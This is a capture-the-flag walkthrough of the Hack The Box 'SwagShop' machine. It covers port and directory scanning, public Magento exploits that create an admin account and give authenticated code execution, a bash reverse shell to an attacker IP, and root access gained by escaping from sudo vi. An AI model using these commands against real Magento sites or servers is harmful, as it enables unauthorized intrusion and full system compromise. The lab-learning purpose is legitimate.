# recon
## nmap
- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

## 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
- gobuster
```
/app (Status: 301)
/api.php (Status: 200)
/cron.php (Status: 200)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/install.php (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)

```
- about us
```
To all of you, from all of us at Magento Store - Thank you and Happy eCommerce!

John Doe
Some important guy
```
- /js/ : `SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js`
- /install.php : `FAILED ERROR: Magento is already installed `
- /shell
```
[ ]	abstract.php	2014-05-07 14:58 	5.5K	 
[ ]	compiler.php	2014-05-07 14:58 	4.3K	 
[ ]	indexer.php	2014-05-07 14:58 	8.0K	 
[ ]	log.php	2014-05-07 14:58 	5.8K	 
```
- /errors
```
[ ]	404.php	2014-05-07 14:58 	1.0K	 
[ ]	503.php	2014-05-07 14:58 	1.0K	 
[DIR]	default/	2014-05-07 14:58 	- 	 
[ ]	design.xml	2014-05-07 14:58 	1.0K	 
[ ]	local.xml.sample	2014-05-07 14:58 	1.6K	 
[ ]	processor.php	2014-05-07 14:58 	16K	 
[ ]	report.php	2014-05-07 14:58 	1.1K	 
```
- /includes/ : config.php
- **/lib/Magento/Db/Sql**
- /index.php/admin : admin page
 


## foot hold
from searchsploit I found an interesting exploit `Magento eCommerce - Remote Code Execution`. run `searchsploit -x <script>` to read more about the exploit. which lead us to this [blog](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) post. We can use this exploit to create a admin user and gain access to Magento admin panel.
```
kali@kali:~/HTB/swag$ python2 37977.py
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme
```
you can also change the script and modify admin username:password to what ever you like. note that **Magento ver. 1.9.0.0**.


after login it and googling the way to gain foothold exploiting Magento. there are several way to do it.
1. Froghopper which can be found in this [article](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)
2. use another exploit found in `searchsploit` call `Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution` which should work on swagshop since it is 1.9.0.0


some modification is requried to make the script works. you can google about some error which will occur while you try to run the exloit. HTB community forum, could be help full. Or debugg the code by yourself. make sure that the script is working by running `id` or `whoami`
```console
kali@kali:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'whoami'
www-data
```
it works, so let's replace it with bash reverse shell payload:
```console
kali@kali:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'bash -c "bash -i >& /dev/tcp/10.10.14.43/6969 0>&1"'
```
now go grab user flag.

# root
rooting is strait forward..
```console
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```
note that we are allow to use `vi` to edit/create any files in `/var/www/html/`. We will then type `:!sh` in vi to gain shell with root permission.
```console
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/LICENSE.txt
:!sh
*
*
*
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
c2*******************

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```